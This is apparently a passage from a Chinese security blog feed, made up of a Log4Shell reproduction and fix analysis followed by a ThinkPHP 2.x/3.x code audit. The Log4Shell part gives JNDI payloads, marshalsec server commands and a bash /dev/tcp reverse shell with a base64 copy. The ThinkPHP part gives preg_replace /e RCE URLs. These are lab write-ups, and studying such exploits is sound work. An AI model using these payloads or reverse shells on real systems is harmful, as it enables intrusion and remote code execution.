class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.logging.log4j.core.lookup;<br><br><span class="hljs-keyword">import</span> java.util.Objects;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Marker;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.MarkerManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.LogEvent;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.config.plugins.Plugin;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.net.JndiManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.status.StatusLogger;<br><br><span class="hljs-meta">@Plugin(</span><br><span class="hljs-meta">    name = &quot;jndi&quot;,</span><br><span class="hljs-meta">    category = &quot;Lookup&quot;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiLookup</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractLookup</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> StatusLogger.getLogger();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Marker</span> <span class="hljs-variable">LOOKUP</span> <span class="hljs-operator">=</span> MarkerManager.getMarker(<span class="hljs-string">&quot;LOOKUP&quot;</span>);<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONTAINER_JNDI_RESOURCE_PATH_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java:comp/env/&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JndiLookup</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String key)</span> &#123;<br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">jndiName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.convertJndiName(key);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">JndiManager</span> <span class="hljs-variable">jndiManager</span> <span class="hljs-operator">=</span> JndiManager.getDefaultManager();<br>                <span class="hljs-type">Throwable</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                String var6;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var16) &#123;<br>                    var5 = var16;<br>                    <span class="hljs-keyword">throw</span> var16;<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    <span class="hljs-keyword">if</span> (jndiManager != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (var5 != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                jndiManager.close();<br>                            &#125; <span class="hljs-keyword">catch</span> (Throwable var15) &#123;<br>                                var5.addSuppressed(var15);<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            jndiManager.close();<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br><br>                <span class="hljs-keyword">return</span> var6;<br>            &#125; <span class="hljs-keyword">catch</span> (NamingException var18) &#123;<br>                LOGGER.warn(LOOKUP, <span class="hljs-string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, var18);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">convertJndiName</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String jndiName)</span> &#123;<br>        <span class="hljs-keyword">return</span> !jndiName.startsWith(<span class="hljs-string">&quot;java:comp/env/&quot;</span>) &amp;&amp; jndiName.indexOf(<span class="hljs-number">58</span>) == -<span class="hljs-number">1</span> ? <span class="hljs-string">&quot;java:comp/env/&quot;</span> + jndiName : jndiName;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里就是触发jndi注入的地方</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="RMI-to-rce"><a href="#RMI-to-rce" class="headerlink" title="RMI to rce"></a>RMI to rce</h2><p>rmi的限制比较多</p><p>要远程加载类需要<code>**com.sun.jndi.rmi.object.trustURLCodebase=true**</code></p><p><strong>JDK 8u121+</strong> 后，这个属性默认是 <code>**false**</code></p><p>**JDK 9+**移除了 <code>codebase</code> 支持</p><p>下载<code>jdk8u101</code></p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>下面所有的编译/运行都要用<code>jdk 8u101</code></p><p>恶意类<code>Calc.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>); <span class="hljs-comment">// Windows 弹计算器</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>javac .\Calc.java</code>编译生成字节码</p><p><img src="/mdimg/log4j2/1745554067023-34739689-ae1b-4333-bf06-b2d08dcf2d17.png"></p><p>使用marshalsec搭建RMI服务器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">git clone https:<span class="hljs-comment">//github.com/mbechler/marshalsec.git</span><br>cd marshalsec<br>mvn clean <span class="hljs-keyword">package</span> -DskipTests<br>./java -cp ../marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://192.168.100.128:8000/#Calc&quot;</span> <span class="hljs-number">1099</span> <br></code></pre></td></tr></table></figure><p><img src="/mdimg/log4j2/1745554417291-f096d2da-f2e4-4000-9589-c51a86379b13.png"></p><p>开启http.server</p><p><img src="/mdimg/log4j2/1745554438232-bb20e7bc-7e11-4c95-a8d8-2640696fbfc5.png"></p><p>运行客户端<code>jndi</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>); <span class="hljs-comment">// 强制启用</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.trace&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);  <span class="hljs-comment">//日志</span><br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:rmi://192.168.100.128:1099/Calc&#125;&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/log4j2/1745554467675-99ad9212-f315-4cb9-98f9-4c17d65283e3.png"></p><h2 id="LDAP-to-rce"><a href="#LDAP-to-rce" class="headerlink" title="LDAP to rce"></a>LDAP to rce</h2><p><code>./java -cp ../marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;[http://192.168.100.128:8000/#Calc&quot;](http://192.168.100.128:8000/#Calc&quot;) 1389 </code>启动<code>ldap</code>服务</p><p><img src="/mdimg/log4j2/1745561316053-d3bc757d-75cb-4e25-9af6-f40963ef9712.png"></p><p>开启<code>http.server</code>放恶意类</p><p><img src="/mdimg/log4j2/1745561354047-42283f55-a214-406f-ad1b-bd67237d6013.png"></p><p>运行客户端<code>jndi</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>); <span class="hljs-comment">// 强制启用</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>); <span class="hljs-comment">// 强制启用</span><br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://192.168.100.128:1389/Calc&#125;&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/log4j2/1745561382784-e051e002-6677-4570-8eb2-7765ef90e08b.png"></p><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><h3 id="javachains"><a href="#javachains" class="headerlink" title="javachains"></a>javachains</h3><p>可以生成很多java的payload</p><p><a href="https://github.com/vulhub/java-chains/">https://github.com/vulhub/java-chains/</a></p><p>手册 <a href="https://java-chains.vulhub.org/docs/guide">https://java-chains.vulhub.org/docs/guide</a></p><p>用docker部署</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">docker run -d \<br>  --name java-chains \<br>  --restart=always \<br>  -p <span class="hljs-number">8011</span>:<span class="hljs-number">8011</span> \<br>  -p <span class="hljs-number">58080</span>:<span class="hljs-number">58080</span> \<br>  -p <span class="hljs-number">50389</span>:<span class="hljs-number">50389</span> \<br>  -p <span class="hljs-number">50388</span>:<span class="hljs-number">50388</span> \<br>  -p <span class="hljs-number">3308</span>:<span class="hljs-number">3308</span> \<br>  -p <span class="hljs-number">13999</span>:<span class="hljs-number">13999</span> \<br>  -p <span class="hljs-number">50000</span>:<span class="hljs-number">50000</span> \<br>  -p <span class="hljs-number">11527</span>:<span class="hljs-number">11527</span> \<br>  -e CHAINS_AUTH=<span class="hljs-literal">false</span> \<br>  -e CHAINS_PASS= \<br>  javachains/javachains:<span class="hljs-number">1.4</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>登录页面：<code>http://your-ip:8011</code></p><h3 id="JNDI-Injection-Exploit"><a href="#JNDI-Injection-Exploit" class="headerlink" title="JNDI-Injection-Exploit"></a>JNDI-Injection-Exploit</h3><p><code>git clone [https://github.com/sayers522/JNDI-Injection-Exploit.git](https://github.com/sayers522/JNDI-Injection-Exploit.git)</code></p><p><code>mvn clean package -DskipTests</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.128</span>/<span class="hljs-number">6666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>  <span class="hljs-comment">//反弹shell linux</span><br><br>https:<span class="hljs-comment">//ares-x.com/tools/runtime-exec</span><br><br>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br><br></code></pre></td></tr></table></figure><p>这里是windows，就弹计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">../../jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0_101</span>/bin/java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-all.jar -C <span class="hljs-string">&#x27;calc.exe&#x27;</span> -A <span class="hljs-string">&#x27;192.168.100.128&#x27;</span><br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/log4j2/1745568046256-ff28da49-dcd2-4c6e-b9c6-31fcd385dcac.png"></p><p><img src="/mdimg/log4j2/1745568074054-b6b0f6cf-30aa-48e3-a9f7-f485ef560a9a.png"></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p><a href="https://github.com/apache/logging-log4j2/compare/rel/2.14.1...rel/2.15.0">https://github.com/apache/logging-log4j2/compare/rel/2.14.1...rel/2.15.0</a></p><p>直接看diff<code>2.14.0</code>-&gt;<code>2.15.0</code></p><p><code>src/site/xdoc/manual/lookups.xml</code>增加了如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;p&gt;By <span class="hljs-keyword">default</span> the JDNI Lookup only supports the java, ldap, and ldaps protocols or no protocol. Additional<br>  protocols may be supported by specifying them on the &lt;code&gt;log4j2.allowedJndiProtocols&lt;/code&gt; property.<br>  When using LDAP Java classes that implement the Referenceable <span class="hljs-keyword">interface</span> <span class="hljs-title class_">are</span> not supported <span class="hljs-keyword">for</span> security<br>  reasons. Only the Java primative classes are supported by <span class="hljs-keyword">default</span> as well as any classes specified by the<br>  &lt;code&gt;log4j2.allowedLdapClasses&lt;/code&gt; property. When using LDAP only references to the local host name<br>  or ip address are supported along with any hosts or ip addresses listed in the<br>  &lt;code&gt;log4j2.allowedLdapHosts&lt;/code&gt; property.&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>在<code>**log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java**</code></p><p>禁止除<code>**java**</code>、<code>**ldap**</code>、<code>**ldaps**</code>外的其他协议（如<code>**rmi**</code>、<code>**dns**</code>），防止攻击者利用其他协议触发RCE</p><p><img src="/mdimg/log4j2/1745572399238-b5f5aa74-de60-4c4c-a191-3acfd34f2af4.png" alt="img"></p><p>增加了<code>协议</code>、<code>host</code>、<code>referer</code>、<code>classname</code>的校验并且<code>Object_Factory</code>不能加载远程<code>ObjectFactory</code>类</p><p><img src="/mdimg/log4j2/1745572457790-033a1231-9310-41b6-954f-4bb38c9f4996.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>研究</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp2.x &amp; 3.x 代码审计</title>
    <link href="/2025/04/20/thinkphp2.x%20&amp;%203.x%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/04/20/thinkphp2.x%20&amp;%203.x%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a><strong>ThinkPHP</strong></h1><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a><strong>指纹</strong></h3><p><code>/favicon.ico</code></p><p><img src="/mdimg/thinkphp23/1745137139512-c5340b54-4215-4230-aee7-bfcd7c2640ce.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-number">4e5</span>e5d7364f443e28fbf0d3ae744a59a <br>/<span class="hljs-number">4e5</span>e5d7364f443e28fbf0d3ae744a59a<br><span class="hljs-number">4e5</span>e5d7364f443e28fbf0d3ae744a59a-index.html<br>body里有<span class="hljs-string">&quot;十年磨一剑&quot;</span> 或者<span class="hljs-string">&quot;ThinkPHP&quot;</span><br></code></pre></td></tr></table></figure><h3 id="thinkphp的路由"><a href="#thinkphp的路由" class="headerlink" title="thinkphp的路由"></a><strong>thinkphp的路由</strong></h3><h4 id="几种URL模式"><a href="#几种URL模式" class="headerlink" title="几种URL模式"></a><strong>几种URL模式</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">普通模式：<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>=&gt;<span class="hljs-number">0</span><br>?m=模块&amp;c=控制器&amp;a=方法&amp;参数=xx<br>如：?m=Home&amp;c=User&amp;a=test&amp;id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">pathinfo模式(默认模式)：<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>=&gt;<span class="hljs-number">1</span><br>http:<span class="hljs-comment">//localhost/index.php/模块/控制器/方法/参数名/参数值/参数名/参数值</span><br>如：http:<span class="hljs-comment">//localhost/index.php/Home/User/test/username/a/pass/b</span><br><br>PATHINFO模式还包括普通模式和智能模式两种：<br>PATHINFO普通模式：<span class="hljs-string">&#x27;PATH_MODEL&#x27;</span>=&gt;<span class="hljs-number">1</span><br>该模式URL参数没有顺序，例如<br>http:<span class="hljs-comment">//serverName/appName/a/action/id/1/m/module</span><br><br>PATHINFO智能模式:<span class="hljs-string">&#x27;PATH_MODEL&#x27;</span>=&gt;<span class="hljs-number">2</span>, （系统默认的模式）<br>http:<span class="hljs-comment">//serverName/appName/module/action/year/2000/month/01/day/01/</span><br><br>参数之间的分割符由PATH_DEPR参数设置，默认为<span class="hljs-string">&quot;/&quot;</span>，若设置PATH_DEPR为<span class="hljs-string">&quot;^&quot;</span>，<br> <span class="hljs-string">&#x27;URL_PATHINFO_DEPR&#x27;</span>=&gt;<span class="hljs-string">&#x27;/&#x27;</span>,<br>http:<span class="hljs-comment">//serverName/appName/module^action^id^1/</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">rewrite模式<br>http:<span class="hljs-comment">//网址/分组名/控制器名/方法名/参数1/参数值1/参数n/参数值n</span><br>与thinkPHP默认的路由形式<span class="hljs-title function_ invoke__">Pathinfo</span>()形式路由的不同之处就是，缺少了入口文件（index.php）<br>该路由形式不能直接使用，需要配置中间件重写规则才能使用<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">兼容路由模式<br>http:<span class="hljs-comment">//网址/入口文件?s=/分组名/控制器名/方法名/参数1/参数值1</span><br>兼容路由形式只有<span class="hljs-number">1</span>个参数：参数名s<br>如：http:<span class="hljs-comment">//localhost/index.php?s=/Home/User/test/id/100</span><br><br>也可以支持参数分割符号的定义，例如在PATH_DEPR设置为<span class="hljs-string">&quot;~&quot;</span>的情况下，<br> <span class="hljs-string">&#x27;URL_PATHINFO_DEPR&#x27;</span>=&gt;<span class="hljs-string">&#x27;~&#x27;</span>,<br>http:<span class="hljs-comment">//serverName/appName/?s=module~action~id~1</span><br></code></pre></td></tr></table></figure><h2 id="ThinkPHP2"><a href="#ThinkPHP2" class="headerlink" title="ThinkPHP2"></a><strong>ThinkPHP2</strong></h2><p>漏洞成因：使用preg_replace的/e模式匹配路由</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>payload php&lt;=5.6.29</p><p><code>http://10.10.10.199:8080/index.php?s=/index/index/xxx/$&#123;@phpinfo()&#125;</code></p><p><strong>环境搭建：</strong><code>vulhub/thinkphp/2-rce docker compose up -d</code></p><p>写个变量调试一下看<code>_preg_replace_</code><em>的参数</em></p><p><img src="/mdimg/thinkphp23/1745137382684-54514577-230b-4829-aeab-0fdd02985556.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;@(\w+)/([^/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[\&#x27;\1\&#x27;]=&quot;\2&quot;;&#x27;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$paths</span>));<br>替换部分 <span class="hljs-string">&#x27;$var[\&#x27;\1\&#x27;]=&quot;\2&quot;;&#x27;</span>：<br>将匹配到的 key/value 转换成 <span class="hljs-variable">$var</span>[<span class="hljs-string">&#x27;key&#x27;</span>] = <span class="hljs-string">&quot;value&quot;</span>; 的 PHP 代码并执行。<br></code></pre></td></tr></table></figure><p>根据thinkphp的路由规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br>http:<span class="hljs-comment">//serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</span><br></code></pre></td></tr></table></figure><p>这个URL映射到控制器就是解析url里的：操作/[参数名/参数值…]，然后根据路由规则，使用/e模式来执行 </p><p>比如传入</p><p><code>/xxx/$&#123;@phpinfo()&#125;</code></p><p>经过<code>_preg_replace_</code>生成数组</p><p><code>&#39;xxx&#39;&#39; = &quot;$&#123;@phpinfo()&#125;&quot;</code></p><p>那么为什么<code>phpinfo()</code>就会被执行，因为键值用的是双引号，双引号支持变量解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;&#125; 语法允许 动态变量名 或 表达式解析<br>$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125; 会先执行 <span class="hljs-title function_ invoke__">phpinfo</span>() 函数，然后尝试将其返回值作为变量名解析(这里会返回<span class="hljs-literal">true</span>也就是<span class="hljs-number">1</span>  $<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/mdimg/thinkphp23/1745137147773-60174fc9-98f4-4cf4-9bc6-f49680a2fbc0.png"></p><p><strong>可以构造如下payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">/index.php?s=a/b/c/$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;  =&gt;  index.php/a/b/c/$&#123;@<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;<br>/index.php?s=a/b/c/$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;/c/d/e/f<br>/index.php?s=a/b/c/d/e/$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;<br></code></pre></td></tr></table></figure><h2 id="ThinkPHP3"><a href="#ThinkPHP3" class="headerlink" title="ThinkPHP3"></a><strong>ThinkPHP3</strong></h2><h3 id="3-0-3-1-RCE-同thinkphp2"><a href="#3-0-3-1-RCE-同thinkphp2" class="headerlink" title="3.0-3.1 RCE 同thinkphp2"></a><strong>3.0-3.1 RCE 同thinkphp2</strong></h3><h3 id="3-2-3-where-sql注入"><a href="#3-2-3-where-sql注入" class="headerlink" title="3.2.3 where sql注入"></a><strong>3.2.3 where sql注入</strong></h3><p>tp3提供了一些内置方法 在 <code>ThinkPHP/Common/functions.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">A 快速实例化Action类库<br>B 执行行为类<br>C 配置参数存取方法<br>D 实例化模型类 格式 [资源:<span class="hljs-comment">//][模块/]模型</span><br>E 抛出异常处理<br>F 快速文件数据读取和保存 针对简单类型数据 字符串、数组<br>G 记录和统计时间（微秒）和内存使用情况<br>I 获取输入参数 支持过滤和默认值<br>L 语言参数存取方法<br>M 实例化一个没有模型文件的Model<br>N 设置和获取统计数据<br>R 快速远程调用Action类方法 URL 参数格式 [资源:<span class="hljs-comment">//][模块/]控制器/操作</span><br>S 快速缓存存取方法<br>T 获取模版文件 格式 资源:<span class="hljs-comment">//模块@主题/控制器/操作</span><br>U URL动态生成和重定向方法<br>W 快速Widget输出方法<br></code></pre></td></tr></table></figure><p><a href="https://gitee.com/Pro-Li/thinkphp3.2.3/repository/archive/master.zip">https://gitee.com/Pro-Li/thinkphp3.2.3/repository/archive/master.zip</a></p><h4 